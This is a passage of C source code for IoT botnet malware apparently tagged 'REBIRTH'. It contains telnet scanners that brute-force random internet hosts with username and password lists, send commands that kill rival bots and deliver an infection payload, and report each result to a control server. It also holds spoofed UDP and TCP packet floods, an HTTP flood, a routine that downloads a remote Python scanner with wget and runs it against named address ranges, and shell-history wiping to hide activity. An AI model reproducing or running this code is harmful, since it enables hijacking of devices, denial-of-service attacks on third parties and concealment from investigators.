        struct tcp_pseudo {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
int sclose(int fd) {
        if(3 > fd) return 1;
        close(fd);
        return 0;
}
void TelnetScanner(int wait_usec, int maxfds)
{
        int max = getdtablesize() - 100, i, res, num_tmps, j;
       
        char buf[128], cur_dir;
        if (max > maxfds)
                max = maxfds;
        fd_set fdset;
        struct timeval tv;
        socklen_t lon;
        int valopt;
       
       
       
        char line[256];
        char* buffer;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
       
        buffer = malloc(SOCKBUF_SIZE + 1);
        memset(buffer, 0, SOCKBUF_SIZE + 1);
       
        struct telstate_t fds[max];
       
        memset(fds, 0, max * (sizeof(int) + 1));
        for(i = 0; i < max; i++)
        {
            memset(&(fds[i]), 0, sizeof(struct telstate_t));
            fds[i].complete = 1;
            fds[i].sockbuf = buffer;
        }
        while(1) {
                for(i = 0; i < max; i++) {
                        if(fds[i].tTimeout == 0) {
                                fds[i].tTimeout = time(NULL);
                        }
                        switch(fds[i].state) {
            case 0:
                {
                    if(fds[i].complete == 1)
                    {
                        char *tmp = fds[i].sockbuf;
                        memset(&(fds[i]), 0, sizeof(struct telstate_t));
                        fds[i].sockbuf = tmp;
                                   
                        fds[i].ip = getRandomPublicIP();
                    }
                    else if(fds[i].complete == 0)
                    {
                        fds[i].usernameInd++;
                        fds[i].passwordInd++;
                                   
                        if(fds[i].passwordInd == sizeof(Telnet_Passwords) / sizeof(char *))
                        {
                            fds[i].complete = 1;
                            continue;
                        }
                        if(fds[i].usernameInd == sizeof(Telnet_Usernames) / sizeof(char *))
                        {
                            fds[i].complete = 1;
                            continue;
                        }
                    }
                               
                    dest_addr.sin_family = AF_INET;
                    dest_addr.sin_port = htons(23);
                    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                    dest_addr.sin_addr.s_addr = fds[i].ip;
                               
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                               
                    if(fds[i].fd == -1) continue;
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
                    {
                        reset_telstate(&fds[i]);
                    }
                    else
                    {
                        advance_telstate(&fds[i], 1);
                    }
                }
                break;
               
            case 1:
                {
                    FD_ZERO(&fdset);
                    FD_SET(fds[i].fd, &fdset);
                    tv.tv_sec = 0;
                    tv.tv_usec = wait_usec;
                    res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
                   
                    if(res == 1) {
                        fds[i].tTimeout = 0;
                        lon = sizeof(int);
                        valopt = 0;
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                        if(valopt)
                        {
                            reset_telstate(&fds[i]);
                        }
                        else
                        {
                            fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
                            advance_telstate(&fds[i], 2);
                        }
                        continue;
                    }
                    else if(res == -1)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    if(fds[i].tTimeout + 7 < time(NULL))
                    {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
            case 2:
                {
                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
                    {
                        fds[i].tTimeout = time(NULL);
                        if(contains_fail(fds[i].sockbuf))
                        {
                            advance_telstate(&fds[i], 0);
                        }
                        else
                        {
                            advance_telstate(&fds[i], 3);
                        }
                        continue;
                    }
                    if(fds[i].tTimeout + 7 < time(NULL))
                    {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
            case 3:
                {
                    if(send(fds[i].fd, Telnet_Usernames[fds[i].usernameInd], strlen(Telnet_Usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    advance_telstate(&fds[i], 4);
                }
                break;
            case 4:
                {
                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
                    {
                        fds[i].tTimeout = time(NULL);
                        if(contains_fail(fds[i].sockbuf))
                        {
                            advance_telstate(&fds[i], 0);
                        }
                        else
                        {
                            advance_telstate(&fds[i], 5);
                        }
                        continue;
                    }
                    if(fds[i].tTimeout + 7 < time(NULL))
                    {
                        reset_telstate(&fds[i]);
                    }
                }
                break;                             
            case 5:
                {
                    if(send(fds[i].fd, Telnet_Passwords[fds[i].passwordInd], strlen(Telnet_Passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    advance_telstate(&fds[i], 6);
                }
                break;                                 
            case 6:
                {
                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2))
                    {
                        fds[i].tTimeout = time(NULL);
                       
                        if(contains_fail(fds[i].sockbuf))
                        {
                            advance_telstate(&fds[i], 0);
                        }
                        else if(contains_success(fds[i].sockbuf))
                        {
                            if(fds[i].complete == 2)
                            {
                                advance_telstate(&fds[i], 7);
                            }
                            else
                            {
                                sockprintf(mainCommSock, "[ REBIRTH ] Successfully Bruted. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
                                advance_telstate(&fds[i], 7);
                            }
                        }
                        else
                        {
                            reset_telstate(&fds[i]);
                        }
                        continue;
                    }
                    if(fds[i].tTimeout + 7 < time(NULL))
                    {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
               
            case 7:
            {
               
                char RemoveTheTempDirs [80];
                sprintf(RemoveTheTempDirs, "rm -rf %s;", Temp_Directorys);
                if(send(fds[i].fd, RemoveTheTempDirs, strlen(RemoveTheTempDirs), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
                RemoveTempDirs();
                sockprintf(mainCommSock, "[ REBIRTH ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
               
                char killtheproccesses[80];
                sprintf(killtheproccesses, "pkill -9 %s;killall -9 %s;", Bot_Killer_Binarys, Bot_Killer_Binarys);
                if(send(fds[i].fd, killtheproccesses, strlen(killtheproccesses), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
                sockprintf(mainCommSock, "[ REBIRTH ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
               
                advance_telstate(&fds[i], 8);
            }
            break;
            case 8:
                {
                        fds[i].tTimeout = time(NULL);
                       
                        if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0);
                        if(send(fds[i].fd, "shell\r\n", 7, MSG_NOSIGNAL) < 0);
                       
                        if(send(fds[i].fd, Busybox_Payload, strlen(Busybox_Payload), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
                        sockprintf(mainCommSock, "[ REBIRTH ] Sending Infection Payload. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
                       
                       
                        if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, "CONNECTED"))
                        {
                       
                            if(strcasestr(fds[i].sockbuf, "CONNECTED") && fds[i].complete != 3)
                            {
                                sockprintf(mainCommSock, "[ REBIRTH ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
                                fds[i].complete = 3;
                            }
                        }
                       
                        if(fds[i].tTimeout + 10 < time(NULL))
                        {
                            if(fds[i].complete!=3)
                            {
                                sockprintf(mainCommSock, "[ REBIRTH ] Infection Failed. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
                            }
                            reset_telstate(&fds[i]);
                        }
                        break;
                }
            }
        }
    }              
}
 
void MiraiScanner(int wait_usec, int maxfds)
{
        int max = getdtablesize() - 100, i, res, num_tmps, j;
        char buf[128], cur_dir;
        if (max > maxfds)
                max = maxfds;
        fd_set fdset;
        struct timeval tv;
        socklen_t lon;
        int valopt;
        char line[256];
        char* buffer;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        buffer = malloc(SOCKBUF_SIZE + 1);
        memset(buffer, 0, SOCKBUF_SIZE + 1);
        struct telstate_t fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));
        for(i = 0; i < max; i++) {
                memset(&(fds[i]), 0, sizeof(struct telstate_t));
                fds[i].complete = 1;
                fds[i].sockbuf = buffer;
        }
        while(1) {
                for(i = 0; i < max; i++) {
                        if(fds[i].tTimeout == 0) {
                                fds[i].tTimeout = time(NULL);
                        }
                        switch(fds[i].state) {
            case 0:
                {
                    if(fds[i].complete == 1)
                    {
                                   
                        char *tmp = fds[i].sockbuf;
                        memset(&(fds[i]), 0, sizeof(struct telstate_t));
                        fds[i].sockbuf = tmp;
                                   
                                   
                        fds[i].ip = MiraiIPRanges();
                    }
                    else if(fds[i].complete == 0)
                    {
                        fds[i].usernameInd++;
                        fds[i].passwordInd++;
                                   
                        if(fds[i].passwordInd == sizeof(Mirai_Passwords) / sizeof(char *))
                        {
                            fds[i].complete = 1;
                        }
                        if(fds[i].usernameInd == sizeof(Mirai_Usernames) / sizeof(char *))
                        {
                            fds[i].complete = 1;
                            continue;
                        }
                    }
                    dest_addr.sin_family = AF_INET;
                    dest_addr.sin_port = htons(23);
                    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                           
                    dest_addr.sin_addr.s_addr = fds[i].ip;
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    if(fds[i].fd == -1) continue;
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                               
                    if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
                    {
                        reset_telstate(&fds[i]);
                    }
                    else
                    {
                        advance_telstate(&fds[i], 1);
                    }
                }
                break;
            case 1:
                {
                    FD_ZERO(&fdset);
                    FD_SET(fds[i].fd, &fdset);
                    tv.tv_sec = 0;
                    tv.tv_usec = wait_usec;
                    res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
                    if(res == 1)
                    {
                        fds[i].tTimeout = time(NULL);
                        lon = sizeof(int);
                        valopt = 0;
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                        if(valopt)
                        {
                            reset_telstate(&fds[i]);
                        }
                        else
                        {
                            fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
                            advance_telstate(&fds[i], 2);
                        }
                        continue;
                    }
                    else if(res == -1)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    if(fds[i].tTimeout + 7 < time(NULL))
                    {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
            case 2:
                {
                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
                    {
                        fds[i].tTimeout = time(NULL);
                        if(contains_fail(fds[i].sockbuf))
                        {
                            advance_telstate(&fds[i], 0);
                        }
                        else
                        {
                            advance_telstate(&fds[i], 3);
                        }
                        continue;
                    }
                    if(fds[i].tTimeout + 7 < time(NULL))
                    {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
            case 3:
                {
                    if(send(fds[i].fd, Mirai_Usernames[fds[i].usernameInd], strlen(Mirai_Usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    advance_telstate(&fds[i], 4);
                }
                break;
            case 4:
                {
                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
                    {
                        fds[i].tTimeout = time(NULL);
                        if(contains_fail(fds[i].sockbuf))
                        {
                            advance_telstate(&fds[i], 0);
                        }
                        else
                        {
                            advance_telstate(&fds[i], 5);
                        }
                        continue;
                    }
                    if(fds[i].tTimeout + 7 < time(NULL))
                    {
                        reset_telstate(&fds[i]);
                    }
                }
                break;                             
            case 5:
                {
                    if(send(fds[i].fd, Mirai_Passwords[fds[i].passwordInd], strlen(Mirai_Passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    advance_telstate(&fds[i], 6);
                }
                break;                                 
            case 6:
                {
                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2)) //waiting for response.
                    {
                        fds[i].tTimeout = time(NULL);
                        if(contains_fail(fds[i].sockbuf))
                        {
                            advance_telstate(&fds[i], 0);
                        }
                        else if(contains_success(fds[i].sockbuf))
                        {
                            if(fds[i].complete == 2)
                            {
                                advance_telstate(&fds[i], 7);
                            }
                            else
                            {
                                sockprintf(mainCommSock, "[ REBIRTH ] Successfully Bruted. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Mirai_Usernames[fds[i].usernameInd], Mirai_Passwords[fds[i].passwordInd]);
                                advance_telstate(&fds[i], 7);
                            }
                        }
                        else
                        {
                            reset_telstate(&fds[i]);
                        }
                        continue;
                    }
                    if(fds[i].tTimeout + 7 < time(NULL))
                    {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
            case 7:
                {
               
                char RemoveTheTempDirs [80];
                sprintf(RemoveTheTempDirs, "rm -rf %s;", Temp_Directorys);
                if(send(fds[i].fd, RemoveTheTempDirs, strlen(RemoveTheTempDirs), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
                RemoveTempDirs();
                sockprintf(mainCommSock, "[ REBIRTH ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
               
                char killtheproccesses[80];
                sprintf(killtheproccesses, "pkill -9 %s;killall -9 %s;", Bot_Killer_Binarys, Bot_Killer_Binarys);
                if(send(fds[i].fd, killtheproccesses, strlen(killtheproccesses), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
                sockprintf(mainCommSock, "[ REBIRTH ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
               
                advance_telstate(&fds[i], 8);
                }
                break;
            case 8:
            {      
               
                        fds[i].tTimeout = time(NULL);
                       
                        if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0);
                        if(send(fds[i].fd, "shell\r\n", 7, MSG_NOSIGNAL) < 0);
                       
                        if(send(fds[i].fd, Busybox_Payload, strlen(Busybox_Payload), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
                        sockprintf(mainCommSock, "[ REBIRTH ] Sending Infection Payload. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Mirai_Usernames[fds[i].usernameInd], Mirai_Passwords[fds[i].passwordInd]);
                       
                        //int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings)
                        if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, "connected"))
                        {
                            //char  strcasestr (const char *big, const char *little)
                            if(strcasestr(fds[i].sockbuf, "CONNECTED") && fds[i].complete != 3)
                            {
                                sockprintf(mainCommSock, "[ REBIRTH ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Mirai_Usernames[fds[i].usernameInd], Mirai_Passwords[fds[i].passwordInd]);
                            }
                        }
                        if(fds[i].tTimeout + 45 < time(NULL))
                        {  
                            if(fds[i].complete!=3)
                            {
                                sockprintf(mainCommSock, "[ REBIRTH ] Infection Failed. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Mirai_Usernames[fds[i].usernameInd], Mirai_Passwords[fds[i].passwordInd]);
                            }
                            reset_telstate(&fds[i]);
                        }
                break;
                }
            }
        }
    }              
}
 
void SendSTD(unsigned char *ip, int port, int secs) {
    int iSTD_Sock;
    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        if (a >= 50) {
            send(iSTD_Sock, "std", 69, 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(iSTD_Sock);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void SendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        register unsigned int pollRegister;
        pollRegister = pollinterval;   
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd) {
                        return;
                }
                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
                        return;
                }
                int counter = 50;
                while(counter--) {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }
                in_addr_t netmask;
                netmask = ( ~((1 << (32 - spoofit)) - 1) );
                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;
                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1) {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl( getRandomIP(netmask) );
                        iph->check = csum ((unsigned short *) packet, iph->tot_len);
                        if(i == pollRegister) {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
void SendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval, int spoofit) {
        register unsigned int pollRegister;
        pollRegister = pollinterval;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd) { return; }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) { return; }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        if(!strcmp(flags, "all")) {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch) {
                        if(!strcmp(pch,         "syn")) { tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst")) { tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin")) { tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack")) { tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh")) { tcph->psh = 1;
                        } else {
                        }
                        pch = strtok(NULL, ",");
                }
        }
        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1) {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                if(i == pollRegister) {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;    
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}
void SendHTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1];
    for (i = 0; i < power; i++) {
        sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, host, useragents[(rand() % 36)]);
        if (fork()) {
            while (end > time(NULL)) {
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            exit(0);
        }
    }
}
 
void ClearHistory()
{
    system("history -c;history -w");
    system("cd /;rm -rf ~/.bash_history");
}
 
void RandomPythonRange()
{
    //GET TO THIS SHIT LATER.
}
 
void processCmd(int argc, unsigned char *argv[]) {
        if(!strcmp(argv[0], "PING"))
        {
                return;
        }
        if(!strcmp(argv[0], "TELNET"))
        {
            if(!strcmp(argv[1], "ON"))
            {
                uint32_t parent;
                parent = fork();        
                int ii = 0;
                int forks = sysconf( _SC_NPROCESSORS_ONLN );
                int fds = 999999;
                if(forks == 1) fds = 500;
                if(forks >= 2) fds = 1000;
                if (parent > 0)
                {
                    scanPid = parent;
                    return;
                }
                else if(parent == -1) return;
 
                for (ii = 0; ii < forks; ii++)
                {
                    srand((time(NULL) ^ getpid()) + getppid());
                    init_rand(time(NULL) ^ getpid());
                    TelnetScanner(100, fds);
                    _exit(0);
                }
            }
            if(!strcmp(argv[1], "OFF"))
            {
                if(scanPid == 0) return;
                kill(scanPid, 9);
                scanPid = 0;
            }
            if(!strcmp(argv[1], "FASTLOAD"))
            {
                int threads = atoi(argv[1]);
                int usec = atoi(argv[2]);
                if(!listFork())
                {
                    sockprintf(mainCommSock, "[TELNET] Starting Fastload.");
                    TelnetScanner(usec, threads);
                    _exit(0);
                }
                return;
            }
        }
        if(!strcmp(argv[0], "MIRAI"))
        {
            if(!strcmp(argv[1], "ON"))
            {
               
                uint32_t parent;
                parent = fork();        
                int ii = 0;
                int forks = sysconf( _SC_NPROCESSORS_ONLN );
                int fds = 999999;
                if(forks == 1) fds = 500;
                if(forks >= 2) fds = 1000;
                if (parent > 0)
                {
                    scanPid = parent;
                    return;
                }
                else if(parent == -1) return;
   
                for (ii = 0; ii < forks; ii++)
                {
                    srand((time(NULL) ^ getpid()) + getppid());
                    init_rand(time(NULL) ^ getpid());
                    MiraiScanner(100, fds);
                    _exit(0);
                }
            }
            if(!strcmp(argv[1], "OFF"))
            {
                if(scanPid == 0) return;
 
                kill(scanPid, 9);
                scanPid = 0;
            }
            if(!strcmp(argv[1], "FASTLOAD"))
            {
                int threads = atoi(argv[1]);
                int usec = atoi(argv[2]);
                if(!listFork())
                {
                    sockprintf(mainCommSock, "Starting scanner!!");
                    MiraiScanner(usec, threads);
                    _exit(0);
                }
                return;
            }
        }
           
        if(!strcmp(argv[0], "PYTHON")) //Infect a Scanner server to the net, before executing this.
        {
            char SendPythonCommand[80];
           
            if(!strcmp(argv[1], "INSTALL"))
            {
                system("sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;");
                sockprintf(mainCommSock, "[PYTHON] Installing Dependencies.");
               
                char MakePythonDirectory[80];              
                sprintf(MakePythonDirectory, "sudo mkdir %s;", Python_Temp_Directory);
                system(MakePythonDirectory);
                sockprintf(mainCommSock, "[PYTHON] Making Directorys.");
               
               
                char WgetPythonPayload[80];
                sprintf(WgetPythonPayload, "cd %s;wget %s;", Python_Temp_Directory, Python_File_Location);
                system(WgetPythonPayload);
                sockprintf(mainCommSock, "[PYTHON] Downloading Scanner.");             
               
                ClearHistory();
               
                sockprintf(mainCommSock, "[PYTHON] Done with installation.");
            }
            if(!strcmp(argv[1], "UPDATE"))
            {
                char ClearPythonDirectory[80];
                sprintf(ClearPythonDirectory, "cd %s;rm -rf scan.py", Python_Temp_Directory);
                system(ClearPythonDirectory);
                sockprintf(mainCommSock, "[PYTHON] Finishied Removing Existing Scanner.");
                ClearHistory();
               
                sockprintf(mainCommSock, "[PYTHON] Done Updating Scanner.");
            }
            if(!strcmp(argv[1], "OFF"))
            {
                system("killall -9 python;pkill -9 python");
                ClearHistory();
                sockprintf(mainCommSock, "[PYTHON] Killing Python Scanning Process.");
            }
            if(!strcmp(argv[1], "1"))
            {
                char idefk[80];
                sprintf(idefk, "cd %s;python scan.py 376 B 119.93 lol", Python_Temp_Directory);
                system(idefk);
                ClearHistory();
                sockprintf(mainCommSock, "[PYTHON] Range: 119.93.x.x || Port 22");
            }
            if(!strcmp(argv[1], "2"))
            {
 
                char idefk[80];
                sprintf(idefk, "cd %s;python scan.py 376 B 91.98 2", Python_Temp_Directory);
                system(idefk);
                ClearHistory();
                sockprintf(mainCommSock, "[PYTHON] Range: 91.98.x.x || Port: 22");
            }
            if(!strcmp(argv[1], "3"))
            {
                char idefk[80];
                sprintf(idefk, "cd %s;python scan.py 376 B 118.173 2", Python_Temp_Directory);
                system(idefk);
                ClearHistory();
